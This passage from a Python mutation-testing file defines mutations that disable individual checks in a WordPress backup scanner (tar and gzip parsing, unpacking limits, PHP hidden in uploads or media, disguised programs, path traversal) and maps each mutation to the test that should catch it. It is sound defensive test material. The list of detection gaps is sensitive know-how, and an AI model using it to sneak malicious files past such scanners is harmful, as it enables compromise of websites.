    "tiff_motorola": "  { kind: 'tiff_motorola', offset: 0, bytes: [0x4d, 0x4d, 0x00, 0x2a] },\n",
    "avif_or_heic": "  { kind: 'avif_or_heic', offset: 4, bytes: [0x66, 0x74, 0x79, 0x70] },\n",
}

GUNZIP = "scanner/gunzip.js"


def unpacked(label: str) -> str:
    return f"test_gunzip.py::test_gzip_unpacks_like_zlib[{label}]"


LIMIT_TEST = "test_database.py::test_a_packed_dump_is_unpacked_only_to_the_limit"
PACKED_DUMP_MUTATIONS: list[Mutation] = [
    Mutation(
        "gzip members after the first not read", GUNZIP, "    members += 1;\n    state = HEADER;", "    members += 1;\n    state = PADDING;",
        (sample("database_packed_in_members"), unpacked("four members")),
    ),
    Mutation("gzip checksum not compared", GUNZIP, "if (crc !== memberCrc || size", "if (size", (unpacked("wrong checksum"),)),
    Mutation("overlapping match copied at once", GUNZIP, "if (distance >= matchLength) {", "if (true) {", (unpacked("rows, default, level 6"),)),
    Mutation(
        "match may reach the member before", GUNZIP, "if (distance > written - memberStart) {", "if (distance > written) {",
        (unpacked("match reaches the member before"),),
    ),
    Mutation(
        "any byte allowed after zeros behind a member", GUNZIP, "      if (input[at] !== 0) {\n", "      if (false) {\n",
        (unpacked("member then zeros and text"),),
    ),
    Mutation("stored block length not checked", GUNZIP, "if ((length ^ 0xffff) !== complement) {", "if (false) {", (unpacked("stored length without its complement"),)),
    Mutation("unpacking has no limit", GUNZIP, "    if (emittedBytes > limitBytes) fail('too_large');\n", "", (LIMIT_TEST,)),
    Mutation("packed dump read as text", DATABASE, "if (GZIP_START.every((byte, index) => start[index] === byte)) {", "if (false) {", (sample("database_packed"),)),
    Mutation(
        "every dump unpacked", DATABASE, "if (GZIP_START.every((byte, index) => start[index] === byte)) {", "if (true) {",
        (sample("database_packing_told_by_content"),),
    ),
    Mutation("UpdraftPlus dump name not known", DATABASE, r"|-db\d*\.gz)$/i", r")$/i", (sample("database_packed_in_members"),)),
    Mutation(".sql.gz name not known", DATABASE, r"|\.sql\.gz|", "|", (sample("database_packed"),)),
    Mutation("cut packed dump not said", DATABASE, " || unpacking === 'truncated'", "", (sample("database_packed_cut"),)),
    Mutation("damaged packed dump not said", DATABASE, " || unpacking === 'damaged'", "", (sample("database_packed_with_text_after"),)),
    switch_off("packed dump past the limit not said", DATABASE, "unpacking === 'too_large'", LIMIT_TEST),
    Mutation(
        "packed dump also named as an archive left unopened", ENGINE, "  if (kind === 'gzip' && isDatabaseDump(entry.name)) return;\n", "",
        (sample("database_packed"), sample("packed_dump_inside_nested_zip")),
    ),
]

TAR_ARCHIVE = "scanner/tar-archive.js"
TAR_READER = "scanner/tar-reader.js"
ENTRIES = "scanner/entries.js"
TAR_TEST = "test_tar.py::"
TAR_MUTATIONS: list[Mutation] = [
    Mutation("tar never opened", ENGINE, "if (packing === 'gzip' || looksLikeTar(first)) {", "if (false) {", (sample("tar_clean"), sample("tar_gz_clean"))),
    Mutation(
        "plain tar not told by its first header", ENGINE, "if (packing === 'gzip' || looksLikeTar(first)) {", "if (packing === 'gzip') {",
        (sample("tar_clean"),),
    ),
    Mutation(
        "damaged tar header ends the listing", TAR_READER,
        "      if (damagedAt < 0) damagedAt = headerOffset;\n      archiveAnomalies.add('damaged_header');\n",
        "      stop('damaged');\n", (sample("tar_damaged_header"),),
    ),
    Mutation(
        "damaged tar header not said", TAR_ARCHIVE,
        "  if (listing.anomalies.includes('damaged_header')) problems.push({ code: 'damaged_header', path: '', params: { offset: listing.damagedAt } });\n",
        "", (sample("tar_damaged_header"),),
    ),
    Mutation(
        "hard link takes no data", TAR_ARCHIVE, "tarEntry.kind === 'hardlink' ? latestOf.get(tarEntry.linkName) ?? null : tarEntry",
        "tarEntry", (sample("tar_hard_links"),),
    ),
    Mutation("hard link without target reads as empty", TAR_ARCHIVE, "latestOf.get(tarEntry.linkName) ?? null :", "latestOf.get(tarEntry.linkName) ?? tarEntry :", (sample("tar_hard_links"),)),
    Mutation(
        "data behind a lone zero block only amber", TAR_ARCHIVE, "const hidesEntries = listing.anomalies.includes('lone_zero_block') && ",
        "const hidesEntries = false && ", (sample("tar_data_after_lone_end"),),
    ),
    Mutation(
        "data after the tar end not said", TAR_ARCHIVE,
        "  else if (listing.anomalies.includes('data_after_end')) problems.push({ code: 'data_after_end', path: '', params: { offset: listing.endOffset } });\n",
        "", (sample("tar_data_after_end"),),
    ),
    Mutation(
        "tar entry anomalies not said", TAR_ARCHIVE,
        "const ENTRY_PROBLEMS = new Map([\n  ['size_without_data', 'size_without_data'], ['file_named_as_folder', 'file_named_as_folder'],\n  ['size_read_differently', 'size_read_differently'],\n]);",
        "const ENTRY_PROBLEMS = new Map();", (sample("tar_size_without_data"), sample("tar_file_named_as_folder"), sample("tar_global_size")),
    ),
    Mutation(
        "size field of a link taken as its data", TAR_ARCHIVE, "if (data !== null) size = data.readable ? data.storedBytes : data.size;",
        "if (data !== null) size = data.size;", (sample("tar_device_with_size"),),
    ),
    Mutation(
        "duplicate tar name not said", TAR_ARCHIVE, "if (!primary.isDirectory && seen.has(name)) problems.push(", "if (false) problems.push(",
        (sample("tar_duplicate_name"),),
    ),
    switch_off("truncated tar not said", TAR_ARCHIVE, "!isUnpackingCut && listing.state === 'truncated'", sample("tar_truncated")),
    switch_off("tar without end marker not said", TAR_ARCHIVE, "!isUnpackingCut && listing.state === 'no_end'", sample("tar_no_end")),
    switch_off("unreadable tar header not said", TAR_ARCHIVE, "listing.state === 'damaged'", sample("tar_damaged")),
    Mutation(
        "damaged gzip around a tar not said", TAR_ARCHIVE, "if (unpacking.state === 'damaged' || unpacking.state === 'truncated') {", "if (false) {",
        (sample("tar_gzip_damaged"),),
    ),
    switch_off("tar.gz past the limit not said", TAR_ARCHIVE, "unpacking.state === 'too_large'", TAR_TEST + "test_unpacking_stops_at_the_limit_and_says_so"),
    Mutation(
        "too many tar entries not refused", TAR_ARCHIVE,
        "  if (listing.state === 'too_many') throw new TarFormatError('too_many_entries', { entries: maxEntries });\n", "",
        (TAR_TEST + "test_too_many_entries_stop_the_scan",),
    ),
    Mutation(
        "a tar listing nothing read as an empty archive", TAR_ARCHIVE,
        "  if (tarEntries.length === 0 && listing.state !== 'ended') throw new TarFormatError('not_a_tar');\n", "",
        (sample("archive_signature[tar]"),),
    ),
    # The pax findings of the Fable review, 2026-11-21.
    Mutation(
        "Solaris pax header read as a file", TAR_READER, "const LOCAL_PAX_TYPES = new Set([TYPE_PAX, TYPE_PAX_SOLARIS]);",
        "const LOCAL_PAX_TYPES = new Set([TYPE_PAX]);", (sample("tar_pax_solaris_name"),),
    ),
    Mutation(
        "pax length read by Number", TAR_READER, "    const length = decimalOrNull(PAX_DECODER.decode(content.subarray(digitsAt, digitsEnd)));\n",
        "    const laxEnd = content.indexOf(ASCII_SPACE, digitsAt);\n    if (laxEnd >= 0) digitsEnd = laxEnd;\n"
        "    const length = Number(PAX_DECODER.decode(content.subarray(digitsAt, digitsEnd)));\n",
        (sample("tar_pax_malformed_length"),),
    ),
    Mutation(
        "pax size read by Number", TAR_READER, "const size = decimalOrNull(records.get('size'));", "const size = Number(records.get('size'));",
        (sample("tar_pax_size_not_decimal"),),
    ),
    Mutation(
        "malformed pax not said", TAR_ARCHIVE, "  if (listing.anomalies.includes('malformed_pax')) problems.push({ code: 'malformed_pax', path: '', params: {} });\n", "",
        (sample("tar_pax_malformed_length"),),
    ),
    # The second Fable review (2026-11-21): headers tar programs read differently.
    Mutation(
        "data not checked under its other names", TAR_ARCHIVE,
        "    for (const other of others) entries.push({ ...primary, index: entries.length, name: other, nameBytes: ENCODER.encode(other) });\n", "",
        (sample("tar_global_path"), sample("tar_override_across_damaged_block")),
    ),
    Mutation(
        "pax read the strict way only", TAR_READER, "  return { records: gnu.records, otherReadings: differs ? [strict.records] : []",
        "  return { records: strict.records, otherReadings: differs ? [gnu.records] : []", (sample("tar_pax_two_blanks"), sample("tar_pax_nul_in_key")),
    ),
    Mutation(
        "other pax readings dropped", TAR_READER, "otherReadings: differs ? [strict.records] : []", "otherReadings: []",
        (sample("tar_pax_nul_in_key"), sample("tar_pax_two_blanks")),
    ),
    Mutation(
        "byte order mark dropped", TAR_READER, "new TextDecoder('utf-8', { ignoreBOM: true })", "new TextDecoder('utf-8')", (sample("tar_pax_bom_key"),),
    ),
    Mutation("pax path not cut at NUL", TAR_READER, "  const cut = end < 0 ? bytes : bytes.subarray(0, end);\n", "  const cut = bytes;\n", (sample("tar_pax_nul_in_path"),)),
    Mutation(
        "empty pax path applied", TAR_READER, "  return cut.length === 0 ? null : cut.slice();", "  return cut.slice();", (sample("tar_pax_empty_path"),),
    ),
    Mutation("long name after pax wins", TAR_READER, "    if (next.hasPaxPath) {\n      next.otherNames.push(longName);", "    if (false) {\n      next.otherNames.push(longName);", (sample("tar_pax_then_long_name"),)),
    Mutation(
        "second pax header adds to the first", TAR_READER, "    if (next.paxHeaders > 1) {", "    if (false) {", (sample("tar_two_pax_headers"),),
    ),
    Mutation(
        "global path read alike by all", TAR_READER, "if (globalPax.has('path') || globalPax.has('linkpath') || pax.isMalformed) globalIrregular = true;",
        "if (pax.isMalformed) globalIrregular = true;", (sample("tar_global_path"),),
    ),
    Mutation("global size read alike by all", TAR_READER, "    if (globalPax.has('size')) globalSizeDiffers = true;\n", "", (sample("tar_global_size"),)),
    Mutation(
        "override kept across a damaged block", TAR_READER, "      if (hasOverride(next)) next.irregular = true;\n", "",
        (sample("tar_override_across_damaged_block"),),
    ),
    Mutation(
        "gzip header limit back to 64 KB", GUNZIP, "const HEADER_LIMIT_BYTES = 16 * 1024 * 1024;", "const HEADER_LIMIT_BYTES = 64 * 1024;",
        (sample("tar_gz_long_gzip_name"),),
    ),
    # Stage 3: a dump dropped by itself, and tars inside the copy.
    Mutation(
        "dump dropped alone not read", ENGINE,
        "      if (packing === 'gzip' && error instanceof TarFormatError && error.code === 'not_a_tar') return dumpAlone(file);\n", "",
        (sample("dump_alone_packed"), sample("dump_alone_any_name")),
    ),
    Mutation(
        "plain .sql dropped alone not read", ENGINE, "&& PLAIN_DUMP_NAME.test(nameOfFile(file))) return dumpAlone(file);",
        "&& false) return dumpAlone(file);", (sample("dump_alone_plain"),),
    ),
    Mutation(
        "any text dropped alone read as a dump", ENGINE, "&& PLAIN_DUMP_NAME.test(nameOfFile(file))) return dumpAlone(file);",
        ") return dumpAlone(file);", (sample("plain_text_alone"),),
    ),
    Mutation(
        "missing plugins said for a dump alone", ENGINE, "if (rule !== 'db.active_plugin_missing') reporter.report(", "if (true) reporter.report(",
        (sample("dump_alone_plain"),),
    ),
    Mutation("dump alone not said", ENGINE, "  reporter.report('scan.dump_only', '', {});\n", "", (sample("dump_alone_packed"),)),
    Mutation("tar in the copy not opened", ENGINE, "if (!isZipKind(kind) && !TAR_KINDS.has(kind)) {", "if (!isZipKind(kind)) {", (sample("nested_tar"), sample("nested_tar_gz"))),
    Mutation(
        "nested tar read as a zip", ENGINE, "  if (!TAR_KINDS.has(kind)) return { source:", "  if (true) return { source:",
        (sample("nested_tar"), sample("nested_tar_damaged_header")),
    ),
    Mutation(
        "nested gzip without a tar called damaged", ENGINE, "error.code === 'not_a_tar' && candidate.kind === 'gzip' ? 'format'",
        "false ? 'format'", (TAR_TEST + "test_a_nested_archive_not_opened_says_why",),
    ),
    Mutation(
        "nested tar.gz unpacks to the copy's limit", ENGINE, ", limitBytes: NESTED_UNPACKED_LIMIT_BYTES });", " });",
        (sample("nested_tar_gz_past_limit"),),
    ),
    Mutation(
        "tar data past the end read", ENTRIES,
        "  if (entry.headerOffset + entry.compressedSize > source.size) return { unreadable: 'out_of_bounds' };\n", "",
        (sample("tar_truncated"),),
    ),
    Mutation("space between tar files accounted for", ENGINE, "const accountsForSpace = archive.format !== 'tar';", "const accountsForSpace = true;", (sample("tar_clean"),)),
    Mutation(
        "tar data looked for behind a zip header", ENTRIES,
        "  if (BARE_FORMATS.has(archive.format)) return locateBareData(source, entry, { wantPacked, readAhead });\n", "", (sample("tar_clean"), sample("dump_alone_plain")),
    ),
    Mutation("checksum compared on tar entries", ENGINE, "isWholeFile && entry.crc32 !== null && crc32(content)", "isWholeFile && crc32(content)", (sample("tar_clean"),)),
    Mutation(
        "tar.gz file read through as packed bytes", ENTRIES,
        "{ tailBytes, deadline, inspect }) => {\n  let stream = container.source.stream(dataStart, dataStart + entry.compressedSize);",
        "{ tailBytes, deadline, inspect }) => {\n  let stream = container.source.blob.slice(dataStart, dataStart + entry.compressedSize).stream();",
        (sample("tar_gz_reads_past_resume_points"),),
    ),
    Mutation(
        "zip in a tar.gz sliced from the packed file", ENGINE, "const isInPlace = copy.source instanceof ArchiveSource;", "const isInPlace = true;",
        (sample("tar_gz_nested_zips"),),
    ),
    Mutation(
        "a file both tar and zip not said", TAR_ARCHIVE, "  if (zipSide !== null) problems.push(", "  if (false) problems.push(",
        (sample("tar_also_a_zip"), sample("tar_gz_also_a_zip"), sample("tar_last_file_a_zip")),
    ),
    Mutation(
        "zip glued behind a tar.gz not seen", TAR_ARCHIVE, "  if (packing === 'gzip') return '';\n", "  if (packing === 'gzip') return null;\n",
        (sample("tar_gz_also_a_zip"),),
    ),
    Mutation(
        "zip near the end of the tar taken as harmless", TAR_ARCHIVE, "return holder === undefined ? '' : holder.name;", "return holder === undefined ? '' : null;",
        (sample("tar_last_file_a_zip"),),
    ),
    Mutation(
        "the name decides the format", ENGINE, "const packing = first[0] === GZIP_START[0]", "const packing = /\\.(gz|tgz)$/.test(file.name) && first[0] === GZIP_START[0]",
        (TAR_TEST + "test_the_name_does_not_decide_the_format",),
    ),
]

MUTATIONS: list[Mutation] = [
    *CODE_MUTATIONS,
    *TAR_MUTATIONS,
    *STEP_3_MUTATIONS,
    *(
        Mutation(f"signature row removed: {kind}", SIGNATURES, SIGNATURE_ROWS[kind], "", (sample(f"executable_signature[{kind}]"),))
        for kind in EXECUTABLE_HEADS
    ),
    *(
        Mutation(f"signature row removed: {kind}", SIGNATURES, SIGNATURE_ROWS[kind], "", (sample(f"archive_signature[{kind}]"),))
        for kind in ARCHIVE_HEADS
    ),
    *(
        Mutation(f"image signature row removed: {kind}", SIGNATURES, IMAGE_ROWS[kind], "", (sample("image_formats_under_any_image_name"),))
        for kind in IMAGE_HEADS
    ),
    switch_off(
        "image name with other content", ENGINE,
        "isUnexplained && IMAGE_EXTENSIONS.has(extension) && !startsLikeAnImage(head)",
        sample("image_name_other_content"),
    ),
    Mutation(
        "empty file judged as not an image", ENGINE,
        "!entry.isSymlink && head.length > 0;", "!entry.isSymlink;",
        (sample("image_name_other_content"),),
    ),
    Mutation(
        "symlink target judged as image content", ENGINE,
        "!holdsPhp && !entry.isSymlink && head.length > 0;", "!holdsPhp && head.length > 0;",
        (sample("layout_mix"),),
    ),
    switch_off(
        "first bytes never compared with program signatures", ENGINE, "isDisguisedProgram",
        sample("dropper"), "test_reference.py::test_engine_agrees_with_the_prototype[dropper]",
    ),
    Mutation(
        "every file under mu-plugins taken as always loaded", ENGINE,
        "  return inside.length === 2 && inside[0].toLowerCase() === MU_PLUGINS_FOLDER && inside[1].endsWith(MU_PLUGIN_ENDING);",
        "  return inside[0].toLowerCase() === MU_PLUGINS_FOLDER;",
        (sample("mu_plugin_files_wordpress_does_not_load"),),
    ),
    Mutation(
        "mu-plugin ending read without letter case", ENGINE,
        "inside[1].endsWith(MU_PLUGIN_ENDING);", "inside[1].toLowerCase().endsWith(MU_PLUGIN_ENDING);",
        (sample("mu_plugin_files_wordpress_does_not_load"),),
    ),
    Mutation(
        "a name kept for a method still counts", PHP_RULES, "  return memberOnly.get(target.text);", "  return false;",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "every use of the variable taken for a method", PHP_RULES,
        "uses.every((at) => isMemberName(tokens, at))", "uses.every(() => true)",
        (code_shape("method_name_also_called"),),
    ),
    Mutation(
        "a name handed to a call taken for the variable's value", PHP_RULES,
        "if (!isAssigned || depth[index] !== depth[first]) return false;", "if (!isAssigned) return false;",
        (code_shape("name_handed_to_a_call"),),
    ),
    switch_off("end of media files never read", ENGINE, "mayHideZipAtEnd(file)", sample("zip_behind_stored_picture")),
    switch_off("damage found on the way to the end not reported", ENGINE, "failure !== ''", sample("damage_past_the_first_bytes_of_media")),
    Mutation(
        "deflated media never read to the end", ENGINE,
        "    : await readThrough(container, file, { tailBytes, deadline, inspect: inside.feed });", "    : { tail: null, failure: '' };",
        (sample("zip_behind_deflated_picture"),),
    ),
    Mutation(
        "end record must end the file", READER,
        "endOfRecord(view, at) <= tail.length) return true;", "endOfRecord(view, at) === tail.length) return true;",
        (sample("zip_behind_picture_then_bytes"),),
    ),
    switch_off("zip behind media opened but not reported", ENGINE, "isBehindMedia", sample("zip_behind_stored_picture")),
    Mutation(
        "an end record without its table taken for a zip", ENGINE,
        "error instanceof ZipFormatError && isBehindMedia && !error.code.startsWith('ambiguous_')", "false",
        (sample("end_record_signature_alone_behind_picture"),),
    ),
    Mutation(
        "the picture in front of a glued zip reported as prepended data", ENGINE,
        "    else if (!isBehindMedia) reporter.report('zip.prepended_data', '', params);",
        "    else reporter.report('zip.prepended_data', '', params);",
        (sample("zip_behind_stored_picture"),),
    ),
    Mutation(
        "media ends left unread are not counted", ENGINE, "    tails.skippedFiles += 1;\n", "",
        ("test_nested_limits.py::test_media_ends_past_the_time_allowed_are_counted",),
    ),
    switch_off("path traversal", ENGINE, "isPathTraversal(logicalName)", sample("layout_mix"), sample("traversal_windows_style")),
    switch_off("symlink", ENGINE, "entry.isSymlink", sample("layout_mix")),
    switch_off("runnable extension", ENGINE, "EXECUTABLE_EXTENSIONS.has(extension)", sample("layout_mix")),
    switch_off("PHP in uploads", ENGINE, "isInUploads(logicalName) && PHP_EXTENSIONS.has(extension)", sample("php_extension_variants")),
    switch_off("PHP inside media", ENGINE, "holdsPhp", sample("layout_mix")),
    Mutation(
        "every PHP file in uploads taken for a guard", ENGINE,
        "const isWholeAndInert = head.length === entry.uncompressedSize && isInertPhp(", "const isWholeAndInert = true || isInertPhp(",
        (sample("uploads_guard_files"),),
    ),
    Mutation(
        "no PHP file in uploads taken for a guard", ENGINE,
        "const isWholeAndInert = head.length === entry.uncompressedSize && isInertPhp(", "const isWholeAndInert = false && isInertPhp(",
        (sample("uploads_guard_files"),),
    ),
    Mutation(
        "guard judged from a part of the file", ENGINE,
        "const isWholeAndInert = head.length === entry.uncompressedSize && isInertPhp(", "const isWholeAndInert = isInertPhp(",
        (sample("uploads_guard_files"),),
    ),
    Mutation(
        "PHP in uploads never read is not reported", ENGINE,
        "  for (const entry of container.uploadsPhpToJudge) container.reporter.report('layout.php_in_uploads', entry.name, {});\n", "",
        (sample("uploads_php_never_read"),),
    ),
    Mutation(
        "PHP 8 attribute read as a comment", "scanner/php-text.js",
        "(text[at] === '#' && text[at + 1] !== '[')", "text[at] === '#'",
        (sample("uploads_guard_files"),),
    ),
    Mutation(
        "short open tag read as text", "scanner/php-text.js",
        "const READINGS = [{ shortTags: true }, { shortTags: false }];", "const READINGS = [{ shortTags: false }];",
        (sample("uploads_guard_files"),),
    ),
    Mutation(
        "guard files judged with short tags on only", "scanner/php-text.js",
        "const READINGS = [{ shortTags: true }, { shortTags: false }];", "const READINGS = [{ shortTags: true }];",
        (sample("uploads_guard_files"), sample("exits_only_with_short_tags")),
    ),
    Mutation(
        "guard files: a form feed after <?php taken for the open tag", "scanner/php-text.js",
        "const LONG_OPEN_TAG = /^<\\?php(?:[ \\t\\r\\n]|$)/i;", "const LONG_OPEN_TAG = /^<\\?php(?:\\s|$)/i;",
        (sample("uploads_guard_files"),),
    ),
    Mutation(
        "a file that is text under one setting not taken to exit there", "scanner/php-text.js",
        "  if (codeStart === null) return true;\n", "  if (codeStart === null) return false;\n",
        (sample("exits_only_with_short_tags"),),
    ),
    Mutation(
        "the reading without short tags skipped", PHP_RULES,
        "  if (!readsTheSameWithoutShortTags(source)) readSignals(tokenizePhpWithoutShortTags(source, tick), { found, note, tick });\n", "",
        (launch_path("hidden_from_short_tags"), launch_path("hidden_after_form_feed")),
    ),
    Mutation(
        "every file taken to read the same without short tags", LEXER,
        "    if (!isTagUnderBothSettings(source, at)) return false;\n", "",
        (launch_path("hidden_from_short_tags"),),
    ),
    Mutation(
        "a bare <? taken for an open tag with short tags off", LEXER,
        "    if (shortTags) return at + 2;\n", "    return at + 2;\n",
        (launch_path("hidden_from_short_tags"),),
    ),
    Mutation(
        "a form feed after <?php taken for the open tag", LEXER,
        "const isOpenTagSpace = (char) => char === ' ' || char === '\\t' || char === '\\n' || char === '\\r';",
        "const isOpenTagSpace = (char) => isSpace(char);",
        (
            launch_path("hidden_after_form_feed"),
            # A translation file opened with "<?php" and a form feed then passes as data.
            "test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",
        ),
    ),
    switch_off("deceptive characters in a name", ENGINE, "deceptive.length > 0", sample("deceptive_names")),
    switch_off("trailing dot or space", ENGINE, "stripTrailingDotsAndSpaces(writtenName) !== writtenName", sample("trailing_dot_and_space")),
    Mutation(
        "trailing dot or space judged on the unpacked name", ENGINE,
        "    const writtenName = entry.writtenName ?? name;\n", "    const writtenName = name;\n",
        (sample("trailing_dot_and_space"), sample("always_loaded_code_written_with_a_final_dot_segment")),
    ),
    switch_off("archive named like media", ENGINE, "nameClass === 'never'", sample("archive_signature[zip]")),
    switch_off("archive behind another extension", ENGINE, "nameClass === 'other'", sample("archive_without_extension")),
    Mutation(
        "archive of another format not reported", ENGINE,
        "    reporter.report('archive.not_opened', entry.name, { kind, bytes, reason: 'format' });\n", "",
        (sample("archive_known_by_extension"), sample("archive_signature[sevenzip]")),
    ),
    Mutation(
        "zips inside the copy never opened", ENGINE,
        "    container.nestedCandidates.push({ entry, dataStart, kind, extension, isDisguised: nameClass !== 'container' });\n", "",
        (sample("nested_program_as_photo"), sample("nested_zip_named_like_document")),
    ),
    Mutation(
        "second level of nesting opened without a word", ENGINE,
        "    reporter.report('archive.not_opened', entry.name, { kind, bytes, reason: 'depth' });\n", "",
        (sample("nested_two_levels"),),
    ),
    Mutation(
        "no limit on what a nested zip unpacks to", "scanner/inflate.js",
        "if (bytes > limitBytes) {", "if (false) {",
        (sample("nested_unpacks_past_limit"),),
    ),
    switch_off("no limit on the number of nested zips", ENGINE, "position >= NESTED_MAX_ARCHIVES", sample("nested_past_archive_count")),
    Mutation(
        "no total limit on unpacking", ENGINE,
        "const limit = Math.min(NESTED_UNPACKED_LIMIT_BYTES, unpackedBudget);", "const limit = NESTED_UNPACKED_LIMIT_BYTES;",
        (sample("nested_past_total_size"),),
    ),
    Mutation(
        "program inside an archive not reported", ENGINE,
        "  if (isNested) return 'layout.executable_in_archive';\n  const isShippedScript", "  const isShippedScript",
        (sample("nested_plain_program"),),
    ),
    # Colours for files that could not be compared.
    Mutation(
        "a text file with PHP among code is red", ENGINE,
        "return runsOnlyWhenIncluded ? 'layout.php_in_text' : 'layout.php_in_media';", "return 'layout.php_in_media';",
        (sample("php_in_text_and_media_files"), sample("plugin_not_on_wordpress_org")),
    ),
    Mutation(
        "a picture with PHP among code is amber", ENGINE,
        "TEXT_FILE_EXTENSIONS.has(extension) && (isNested || isInCodeFolder(logicalName))", "(isNested || isInCodeFolder(logicalName))",
        (sample("php_in_text_and_media_files"),),
    ),
    Mutation(
        "a text file with PHP inside an archive is red", ENGINE,
        "TEXT_FILE_EXTENSIONS.has(extension) && (isNested || isInCodeFolder(logicalName))", "TEXT_FILE_EXTENSIONS.has(extension) && isInCodeFolder(logicalName)",
        (sample("php_in_text_and_media_files"),),
    ),
    Mutation(
        "uploads taken for a folder of code", ENGINE,
        "return !isInUploads(logicalName) && CODE_HOLDING_FOLDERS.some(", "return CODE_HOLDING_FOLDERS.some(",
        (sample("php_in_text_and_media_files"),),
    ),
    Mutation(
        "every folder taken for a folder of code", ENGINE,
        "CODE_HOLDING_FOLDERS.some((folder) => lower.includes(folder))", "true",
        (sample("php_in_text_and_media_files"),),
    ),
    Mutation(
        "a script among code is red", ENGINE,
        "return isShippedScript ? 'layout.script_in_code_folder' : 'layout.executable_extension';", "return 'layout.executable_extension';",
        (sample("scripts_and_programs_by_place"), sample("plugin_not_on_wordpress_org")),
    ),
    Mutation(
        "a program among code is amber", ENGINE,
        "const isShippedScript = SCRIPT_EXTENSIONS.has(extension) && isInCodeFolder(logicalName);", "const isShippedScript = isInCodeFolder(logicalName);",
        (sample("scripts_and_programs_by_place"),),
    ),
    Mutation(
        "PHP open tag read in lower case only", SIGNATURES,
        "(bytes[at + 2] | TO_LOWER_CASE) === 0x70", "bytes[at + 2] === 0x70",
        (sample("php_in_text_and_media_files"), sample("core_differs_from_wordpress_org")),
    ),
    Mutation(
        "PHP at the end of a media file not looked for", ENGINE,
        "  if (holdsPhpOpenTag(tail)) container.reporter.report('layout.php_in_media', entry.name, { extension });\n", "",
        (sample("php_in_text_and_media_files"),),
    ),
    Mutation(
        "an extra file without PHP in a core folder is red", CHECKSUMS,
        "return bytes === null || holdsPhpOpenTag(bytes) ? 'core.extra_file' : 'core.extra_other';", "return 'core.extra_file';",
        (sample("core_differs_from_wordpress_org"),),
    ),
    Mutation(
        "PHP inside an extra core file not looked for", CHECKSUMS,
        "return bytes === null || holdsPhpOpenTag(bytes) ? 'core.extra_file' : 'core.extra_other';",
        "return bytes === null ? 'core.extra_file' : 'core.extra_other';",
        (sample("core_differs_from_wordpress_org"),),
    ),
    Mutation(
        "an extra file named as PHP in a core folder judged by content", CHECKSUMS,
        "  if (PHP_EXTENSIONS.has(extensionOf(entry.name))) return 'core.extra_file';\n", "",
        (sample("core_differs_from_wordpress_org"),),
    ),
    Mutation(
        # The first-bytes pass is where a nested zip meets its deadline first; the code pass
        # repeats the check for zips whose first bytes go fast.
        "time limit of one nested zip", ENGINE,
        "if (now > container.deadline) throw new TimeLimitError();\n    if (now - lastProgress > PROGRESS_INTERVAL_MS) {\n      lastProgress = now;\n      container.progress({ stage: 'first_bytes',",
        "if (false) throw new TimeLimitError();\n    if (now - lastProgress > PROGRESS_INTERVAL_MS) {\n      lastProgress = now;\n      container.progress({ stage: 'first_bytes',",
        ("test_nested_limits.py::test_a_nested_zip_that_takes_too_long_is_cut",),
    ),
    switch_off(
        "total time limit for nested zips", ENGINE, "performance.now() > totalDeadline",
        "test_nested_limits.py::test_nested_zips_past_the_total_time_are_named",
    ),
    switch_off("copy without WordPress files", ENGINE, "!site.looksLikeWordPress", sample("not_wordpress")),
    switch_off("stored entry with two sizes", ENGINE, "entry.method === METHOD_STORED && entry.compressedSize !== entry.uncompressedSize", sample("stored_with_two_sizes")),
    Mutation(
        "encrypted entry not reported", ENGINE,
        "else if (entry.isEncrypted) reporter.report('zip.encrypted_entry', name, {});", "",
        (sample("encrypted_entry"),),
    ),
    Mutation(
        "unknown compression method", ENGINE,
        "else if (!isSupportedMethod(entry)) reporter.report", "else if (false) reporter.report", (sample("unsupported_compression"),),
    ),
    Mutation(
        "unreadable row", ENGINE,
        "if (entry.unreadable) reporter.report", "if (false) reporter.report", (sample("row_needs_missing_64bit_sizes"),),
    ),
    Mutation(
        "row without a file header not reported", ENGINE,
        "      reporter.report('zip.entry_unreadable', entry.name, { reason: located.unreadable });\n", "",
        (sample("row_points_at_no_header"), sample("row_points_outside_archive")),
    ),
    switch_off("overlapping entries", ENGINE, "accountsForSpace && entry.headerOffset < coveredUntil", sample("two_rows_one_file")),
    Mutation(
        "space between files not accounted for", ENGINE,
        "      gaps.push({ start: coveredUntil, bytes: entry.headerOffset - coveredUntil });\n", "",
        (sample("file_missing_from_table"), sample("bytes_between_files"), sample("program_glued_in_front")),
    ),
    switch_off("file header in unlisted bytes", ENGINE, "headerAt >= 0", sample("file_missing_from_table")),
    switch_off("header differs from the table", ENGINE, "located.header.differences.length > 0", sample("header_mismatch[name]")),
    Mutation(
        "silent stretch: no second attempt with more input", ENGINE,
        "    if (unpacked.state === 'starved') {", "    if (false) {",
        (sample("program_behind_silent_stretch"),),
    ),
    Mutation(
        "silent megabyte not reported", ENGINE,
        "    if (unpacked.state === 'starved') reporter.report('entry.head_unreadable', entry.name, {});\n", "",
        (sample("program_behind_silent_megabyte"),),
    ),
    Mutation(
        "damaged data not reported", ENGINE,
        "    if (unpacked.state === 'corrupt') reporter.report('entry.corrupt_data', entry.name, { reason: 'stream' });\n", "",
        (sample("damaged_packed_data"),),
    ),
    switch_off("unpacked size not compared", ENGINE, "isWholeFile && content.length !== entry.uncompressedSize", sample("unpacked_size_differs")),
    switch_off("checksum not compared", ENGINE, "isWholeFile && entry.crc32 !== null && crc32(content) !== entry.crc32", sample("checksum_differs")),
    Mutation(
        "whole files read instead of their first bytes", ENGINE,
        "wantsHead ? Math.min(entry.compressedSize, HEAD_PACKED_BYTES) : 0", "wantsHead ? entry.compressedSize : 0",
        ("test_samples.py::test_zero_bomb_is_not_unpacked",),
    ),

    Mutation(
        "proven official files keep their file-type findings", ENGINE,
        "if (!verified.has(path)) reporter.report(rule, path, params);", "reporter.report(rule, path, params);",
        (sample("plugin_matches_wordpress_org"), sample("core_differs_from_wordpress_org")),
    ),
    Mutation(
        "held findings never released", ENGINE,
        "if (!verified.has(path)) reporter.report(rule, path, params);", "if (false) reporter.report(rule, path, params);",
        (sample("plugin_differs_from_wordpress_org"), sample("plugin_not_on_wordpress_org")),
    ),
    switch_off("nothing held for the checksums", ENGINE, "rule.startsWith('layout.') && mayBeHeld(path)", sample("plugin_matches_wordpress_org")),
    Mutation(
        "official zip opened anyway", ENGINE,
        ".filter((candidate) => !verified.has(candidate.entry.name))", ".filter(() => true)",
        (sample("plugin_matches_wordpress_org"),),
    ),
    Mutation(
        "changed file not reported", CHECKSUMS,
